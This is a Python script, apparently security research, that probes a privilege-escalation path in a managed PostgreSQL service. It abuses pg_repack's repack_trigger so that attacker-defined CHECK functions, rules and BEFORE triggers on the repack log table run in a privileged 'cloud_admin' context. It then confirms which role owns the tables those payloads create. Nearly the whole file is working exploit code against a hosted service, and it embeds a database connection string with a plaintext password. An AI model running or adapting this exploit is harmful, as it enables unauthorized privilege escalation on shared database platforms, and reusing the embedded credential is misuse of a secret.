# -*- coding: utf-8 -*-
"""补丁边界探测:CHECK 约束函数 / RULE 纯DML / RULE+函数,在 cloud_admin SPI INSERT 上下文"""
import psycopg

URI = 'postgresql://neondb_owner:npg_cI5ynlaAqjU2@ep-crimson-fog-w2gucld1.us-east-2.aws.neon.build/neondb'
conn = psycopg.connect(URI, connect_timeout=20)
conn.autocommit = True
cur = conn.cursor()

def q(sql, fetch=True):
    try:
        cur.execute(sql)
        return cur.fetchall() if fetch else 'OK'
    except Exception as e:
        return 'ERR: %s' % str(e)[:280]

q("CREATE EXTENSION IF NOT EXISTS pg_repack", fetch=False)
q("DROP TABLE IF EXISTS k_src", fetch=False)
q("CREATE TABLE k_src(id int, v text)", fetch=False)
oid = q("SELECT 'k_src'::regclass::oid")[0][0]
print('oid:', oid)
q("DROP TYPE IF EXISTS repack.pk_%d CASCADE" % oid, fetch=False)
q("CREATE TYPE repack.pk_%d AS (id int)" % oid, fetch=False)
q("DROP TABLE IF EXISTS repack.log_%d" % oid, fetch=False)
q("CREATE TABLE repack.log_%d (pk repack.pk_%d, row k_src)" % (oid, oid), fetch=False)
q("DROP TRIGGER IF EXISTS t2 ON k_src", fetch=False)
q("CREATE TRIGGER t2 AFTER INSERT ON k_src FOR EACH ROW EXECUTE FUNCTION repack.repack_trigger('id')", fetch=False)
print('setup done')

# --- 场景 A:CHECK 约束调用用户函数 ---
q("DROP FUNCTION IF EXISTS k_checkfn()", fetch=False)
q("""CREATE FUNCTION k_checkfn() RETURNS bool LANGUAGE plpgsql AS $q$
BEGIN EXECUTE 'CREATE TABLE k_via_check AS SELECT current_user u'; RETURN true; END $q$""", fetch=False)
q("ALTER TABLE repack.log_%d DROP CONSTRAINT IF EXISTS chk_a" % oid, fetch=False)
q("ALTER TABLE repack.log_%d ADD CONSTRAINT chk_a CHECK (k_checkfn())" % oid, fetch=False)
print('[A check-fn] insert:', q("INSERT INTO k_src VALUES (2,'x')", fetch=False))
print('[A] k_via_check:', q("SELECT tableowner FROM pg_tables WHERE tablename='k_via_check'"))
q("ALTER TABLE repack.log_%d DROP CONSTRAINT IF EXISTS chk_a" % oid, fetch=False)

# --- 场景 B:RULE 纯 DML(ALSO 到 k_pwned2) ---
q("DROP TABLE IF EXISTS k_via_rule", fetch=False)
q("CREATE TABLE k_via_rule AS SELECT 'x'::text u", fetch=False)
q("DROP RULE IF EXISTS r1 ON repack.log_%d" % oid, fetch=False)
q("CREATE RULE r1 AS ON INSERT TO repack.log_%d DO ALSO INSERT INTO k_via_rule SELECT current_user" % oid, fetch=False)
print('[B rule-dml] insert:', q("INSERT INTO k_src VALUES (3,'x')", fetch=False))
print('[B] k_via_rule rows:', q("SELECT u FROM k_via_rule"))
q("DROP RULE IF EXISTS r1 ON repack.log_%d" % oid, fetch=False)
q("DROP TABLE IF EXISTS k_via_rule", fetch=False)

# --- 场景 C:RULE + 用户函数调用 ---
q("DROP FUNCTION IF EXISTS k_rulefn()", fetch=False)
q("""CREATE FUNCTION k_rulefn() RETURNS text LANGUAGE plpgsql AS $q$
BEGIN EXECUTE 'CREATE TABLE k_via_rfn AS SELECT current_user u'; RETURN 'ok'; END $q$""", fetch=False)
q("DROP TABLE IF EXISTS k_via_rfn", fetch=False)
q("DROP RULE IF EXISTS r2 ON repack.log_%d" % oid, fetch=False)
q("CREATE RULE r2 AS ON INSERT TO repack.log_%d DO ALSO INSERT INTO k_via_rfn SELECT k_rulefn()" % oid, fetch=False)
print('[C rule-fn] insert:', q("INSERT INTO k_src VALUES (4,'x')", fetch=False))
print('[C] k_via_rfn:', q("SELECT tableowner FROM pg_tables WHERE tablename='k_via_rfn'"))
q("DROP RULE IF EXISTS r2 ON repack.log_%d" % oid, fetch=False)

# --- 场景 D:log 表上 BEFORE INSERT 触发器(非 AFTER) ---
q("DROP FUNCTION IF EXISTS k_bfn()", fetch=False)
q("""CREATE FUNCTION k_bfn() RETURNS trigger LANGUAGE plpgsql AS $q$
BEGIN EXECUTE 'CREATE TABLE k_via_before AS SELECT current_user u'; RETURN NEW; END $q$""", fetch=False)
q("DROP TRIGGER IF EXISTS tb ON repack.log_%d" % oid, fetch=False)
q("CREATE TRIGGER tb BEFORE INSERT ON repack.log_%d FOR EACH ROW EXECUTE FUNCTION k_bfn()" % oid, fetch=False)
print('[D before-fn] insert:', q("INSERT INTO k_src VALUES (5,'x')", fetch=False))
print('[D] k_via_before:', q("SELECT tableowner FROM pg_tables WHERE tablename='k_via_before'"))
q("DROP TRIGGER IF EXISTS tb ON repack.log_%d" % oid, fetch=False)

# 清理
q("DROP TRIGGER IF EXISTS t2 ON k_src", fetch=False)
q("DROP FUNCTION IF EXISTS k_checkfn()", fetch=False)
q("DROP FUNCTION IF EXISTS k_rulefn()", fetch=False)
q("DROP FUNCTION IF EXISTS k_bfn()", fetch=False)
q("DROP TABLE IF EXISTS k_src", fetch=False)
q("DROP TABLE IF EXISTS k_via_check", fetch=False)
q("DROP TABLE IF EXISTS k_via_rfn", fetch=False)
q("DROP TABLE IF EXISTS k_via_before", fetch=False)
q("DROP TABLE IF EXISTS repack.log_%d" % oid, fetch=False)
q("DROP TYPE IF EXISTS repack.pk_%d" % oid, fetch=False)
q("DROP EXTENSION IF EXISTS pg_repack", fetch=False)
print('cleanup:', q("SELECT tablename FROM pg_tables WHERE schemaname='public'"))
print('ext:', q("SELECT extname FROM pg_extension WHERE extname='pg_repack'"))
conn.close()
